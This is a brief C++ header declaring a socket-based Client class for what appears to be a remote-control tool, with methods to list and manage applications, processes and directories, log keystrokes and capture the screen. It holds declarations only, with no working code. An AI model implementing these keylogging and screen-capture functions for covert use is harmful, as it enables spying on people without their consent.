#pragma once

#include "../Library.h"

class Client {
private:       
    SOCKET ServerSocket;
    char* ClientIP;

public:
    Client();

    ~Client();

public:
    void ListApp();

    void StartApp(std::string name);

    void StopApp(std::string name);

    void ListProcess();

    void ListDirectory(std::string path);

    void KeyLog();

    void CaptureScreen();
};